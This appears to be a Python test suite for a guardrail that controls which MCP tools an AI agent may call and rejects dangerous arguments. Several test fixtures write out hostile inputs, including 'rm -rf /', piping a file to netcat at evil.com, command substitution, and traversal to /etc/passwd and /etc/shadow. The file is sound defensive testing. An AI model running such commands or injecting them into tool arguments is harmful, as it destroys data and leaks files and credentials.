"""Tests for airlock/guardrails/mcp_tool_guard.py — MCP tool access control."""

from __future__ import annotations

from unittest.mock import MagicMock

import pytest

from airlock.guardrails.mcp_tool_guard import (
    AirlockMCPToolGuard,
    _check_arguments,
    _check_tool_access,
)


# ---------------------------------------------------------------------------
# _check_tool_access()
# ---------------------------------------------------------------------------
class TestCheckToolAccess:
    def test_no_lists_allows_all(self):
        assert _check_tool_access("anything") is None

    def test_allowlist_permits(self, monkeypatch):
        monkeypatch.setenv("AIRLOCK_MCP_ALLOWED_TOOLS", "read_file,search")
        assert _check_tool_access("read_file") is None

    def test_allowlist_blocks_unlisted(self, monkeypatch):
        monkeypatch.setenv("AIRLOCK_MCP_ALLOWED_TOOLS", "read_file,search")
        result = _check_tool_access("delete_file")
        assert result is not None
        assert "not in the allowed" in result

    def test_blocklist_blocks(self, monkeypatch):
        monkeypatch.setenv("AIRLOCK_MCP_BLOCKED_TOOLS", "execute_command,delete_file")
        result = _check_tool_access("delete_file")
        assert result is not None
        assert "blocked by policy" in result

    def test_blocklist_allows_unlisted(self, monkeypatch):
        monkeypatch.setenv("AIRLOCK_MCP_BLOCKED_TOOLS", "execute_command")
        assert _check_tool_access("read_file") is None


# ---------------------------------------------------------------------------
# _check_arguments()
# ---------------------------------------------------------------------------
class TestCheckArguments:
    def test_safe_arguments(self):
        assert _check_arguments({"path": "/home/user/docs", "query": "hello"}) is None

    def test_path_traversal(self):
        result = _check_arguments({"path": "../../etc/passwd"})
        assert result is not None
        assert "dangerous" in result.lower()

    def test_shell_semicolon(self):
        assert _check_arguments({"cmd": "ls; rm -rf /"}) is not None

    def test_shell_pipe(self):
        assert _check_arguments({"cmd": "cat file | nc evil.com 1234"}) is not None

    def test_shell_ampersand(self):
        assert _check_arguments({"cmd": "cmd1 && cmd2"}) is not None

    def test_command_substitution(self):
        assert _check_arguments({"cmd": "$(whoami)"}) is not None

    def test_backtick(self):
        assert _check_arguments({"cmd": "`whoami`"}) is not None

    def test_numeric_values_pass(self):
        assert _check_arguments({"count": "42", "name": "test"}) is None

    def test_redirect(self):
        assert _check_arguments({"cmd": "> /etc/shadow"}) is not None

    def test_nested_dict_path_traversal(self):
        """Nested dict values must be checked — not silently skipped."""
        result = _check_arguments({"config": {"path": "../../etc/passwd"}})
        assert result is not None

    def test_nested_list_shell_injection(self):
        """List values must be checked."""
        result = _check_arguments({"commands": ["safe", "ls; rm -rf /"]})
        assert result is not None

    def test_deeply_nested_dangerous(self):
        """Multi-level nesting should still catch dangerous patterns."""
        result = _check_arguments({"a": {"b": {"c": "$(whoami)"}}})
        assert result is not None

    def test_nested_safe_values(self):
        """Safe nested values should pass."""
        result = _check_arguments({
            "options": {"recursive": "true", "depth": "3"},
            "files": ["/home/user/doc.txt"],
        })
        assert result is None


# ---------------------------------------------------------------------------
# AirlockMCPToolGuard.async_pre_call_hook()
# ---------------------------------------------------------------------------
class TestMCPToolGuardHook:
    @pytest.fixture
    def guard(self):
        return AirlockMCPToolGuard()

    @pytest.fixture
    def mock_cache(self):
        return MagicMock()

    @pytest.fixture
    def mock_user_api_key_dict(self):
        mock = MagicMock()
        mock.api_key = "sk-test-1234567890abcdef"
        return mock

    async def test_no_tool_name_passes(self, guard, mock_user_api_key_dict, mock_cache):
        data = {"messages": [{"role": "user", "content": "hi"}]}
        result = await guard.async_pre_call_hook(
            mock_user_api_key_dict, mock_cache, data, "call_mcp_tool"
        )
        assert result is data

    async def test_allowed_tool_passes(self, guard, mock_user_api_key_dict, mock_cache, monkeypatch):
        monkeypatch.setenv("AIRLOCK_MCP_ALLOWED_TOOLS", "read_file,search")
        data = {
            "mcp_tool_name": "read_file",
            "mcp_arguments": {"path": "/tmp/test.txt"},
        }
        result = await guard.async_pre_call_hook(
            mock_user_api_key_dict, mock_cache, data, "call_mcp_tool"
        )
        assert result is data

    async def test_blocked_tool_raises(self, guard, mock_user_api_key_dict, mock_cache, monkeypatch):
        monkeypatch.setenv("AIRLOCK_MCP_BLOCKED_TOOLS", "delete_file")
        data = {
            "mcp_tool_name": "delete_file",
            "mcp_arguments": {"path": "/tmp/test.txt"},
        }
        with pytest.raises(ValueError, match="blocked by policy"):
            await guard.async_pre_call_hook(
                mock_user_api_key_dict, mock_cache, data, "call_mcp_tool"
            )

    async def test_unlisted_tool_blocked_by_allowlist(
        self, guard, mock_user_api_key_dict, mock_cache, monkeypatch
    ):
        monkeypatch.setenv("AIRLOCK_MCP_ALLOWED_TOOLS", "read_file")
        data = {
            "mcp_tool_name": "execute_command",
            "mcp_arguments": {"cmd": "ls"},
        }
        with pytest.raises(ValueError, match="not in the allowed"):
            await guard.async_pre_call_hook(
                mock_user_api_key_dict, mock_cache, data, "call_mcp_tool"
            )

    async def test_dangerous_argument_blocked(
        self, guard, mock_user_api_key_dict, mock_cache
    ):
        data = {
            "mcp_tool_name": "read_file",
            "mcp_arguments": {"path": "../../etc/passwd"},
        }
        with pytest.raises(ValueError, match="dangerous"):
            await guard.async_pre_call_hook(
                mock_user_api_key_dict, mock_cache, data, "call_mcp_tool"
            )

    async def test_safe_arguments_pass(self, guard, mock_user_api_key_dict, mock_cache):
        data = {
            "mcp_tool_name": "read_file",
            "mcp_arguments": {"path": "/home/user/docs/file.txt"},
        }
        result = await guard.async_pre_call_hook(
            mock_user_api_key_dict, mock_cache, data, "call_mcp_tool"
        )
        assert result is data

    async def test_no_arguments_passes(self, guard, mock_user_api_key_dict, mock_cache):
        data = {"mcp_tool_name": "list_tools"}
        result = await guard.async_pre_call_hook(
            mock_user_api_key_dict, mock_cache, data, "call_mcp_tool"
        )
        assert result is data
